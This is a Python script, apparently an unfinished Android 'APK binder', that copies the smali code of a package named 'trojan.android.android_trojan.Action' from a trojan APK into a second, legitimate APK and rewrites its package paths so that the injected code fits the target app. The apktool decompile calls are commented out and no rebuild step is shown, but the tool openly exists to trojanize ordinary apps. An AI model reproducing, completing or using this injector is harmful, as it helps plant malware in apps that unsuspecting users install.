__author__ = 'hoodlums'

import xml.etree.ElementTree as ET
import fileinput
from subprocess import call
import argparse
import os
import shutil
import sys
import glob


apktool = "/home/hoodlums/apktool/apktool"
TempDirectory = '/tmp/'

packageToInject = 'trojan.android.android_trojan.Action'

apk1 = TempDirectory + 'apk1.apk'
apk2 = TempDirectory + 'apk2.apk'

apk1Directory = TempDirectory + 'apk1/'
apk2Directory = TempDirectory + 'apk2/'

apk1Manifest = apk1Directory + 'AndroidManifest.xml'
apk2Manifest = apk2Directory + 'AndroidManifest.xml'

apk1Smali = apk1Directory + 'smali/'
apk2Smali = apk2Directory + 'smali/'


class ParseArgs:
    def __init__(self):
        self.parser = argparse.ArgumentParser(description='ACTION')
        self.parser.add_argument('--apks', dest='apks', action='store', metavar=('trojanApk', 'apkToInfect'), nargs=2,
                                 default=False,
                                 help='specify the Trojan Apk and the APk to Infect')
        self.args = self.parser.parse_args()

    def getargs(self):
        return self.args


class ParseManifest:
    def __init__(self, manifest):
        self.manifest = ET.parse(manifest)
        self.root = self.manifest.getroot()
        self.permissions = []
        self.services = []
        self.receiver = []
        self.mainactivity = None
        self.mainpackage = None

    def findMainActivity(self):
        if self.mainactivity is None:
            for child in self.root.iter('activity'):
                for child0 in child:
                    for child1 in child0:
                        if child1.get('{http://schemas.android.com/apk/res/android}name') == 'android.intent.action.MAIN':
                            self.mainactivity = child.get('{http://schemas.android.com/apk/res/android}name')
                            return self.mainactivity
        else:
            return self.mainactivity

    def findMainPackage(self, ):
        if self.mainpackage is None:
            self.mainpackage = self.root.get('package')
        return self.mainpackage

    def listPermissions(self):
        if len(self.permissions) == 0:
            for child in self.root.iter('uses-permission'):
                self.permissions.append(child.get('{http://schemas.android.com/apk/res/android}name'))
        return self.permissions

    def listService(self):
        if len(self.services) == 0:
            for child in self.root.iter('service'):
                self.services.append(child.get('{http://schemas.android.com/apk/res/android}name'))
        return self.services

    def listReceiver(self):
        if len(self.receiver) == 0:
            for child in self.root.iter('service'):
                print(child)
                self.receiver.append(child.get('{http://schemas.android.com/apk/res/android}name'))
        return self.receiver


def error(message, ex, code):
    print(message)
    if ex:
        print(ex)
    sys.exit(code)

def sed(file, old, new):
    for line in fileinput.input(file, inplace=True):
        print(line.replace(old, new))



args = ParseArgs().getargs()

if args.apks and os.path.isfile(args.apks[0]) and os.path.isfile(args.apks[1]):
    try:
        shutil.copyfile(args.apks[0], apk1)
        shutil.copyfile(args.apks[1], apk2)
    except IOError as ex:
        error("can't copy the apks to " + TempDirectory, str(ex), 1)
else:
    error("please specify the two apks in args, example : python MixApk.py apk1.apk apk2.apk", None, 2)


try:
    print('pass apktool')
    # call(apktool + " d -v -f -o " + apk1Directory + " " + apk1, shell=True)
    # call(apktool + " d -v -f -o " + apk2Directory + " " + apk2, shell=True)
except OSError as ex:
    error("can't extract the two apk", str(ex), 1)

ParseManifest1 = ParseManifest(manifest=apk1Manifest)
ParseManifest2 = ParseManifest(manifest=apk2Manifest)

apk1Action = apk1Smali + packageToInject.replace('.', '/') + '/'
apk2Action = apk2Smali + ParseManifest2.findMainPackage().replace('.', '/') + '/' + packageToInject.split('.').pop() + '/'

shutil.rmtree(apk2Smali + ParseManifest2.findMainPackage().replace('.', '/') + '/' + packageToInject.split('.').pop() + '/')
shutil.copytree(apk1Smali + packageToInject.replace('.', '/') + '/',
            apk2Smali + ParseManifest2.findMainPackage().replace('.', '/') + '/' + packageToInject.split('.').pop() + '/')

for file in glob.glob(apk2Action + '*.smali'):
    sed(file, ParseManifest1.findMainPackage().replace('.', '/'), ParseManifest2.findMainPackage().replace('.', '/'))


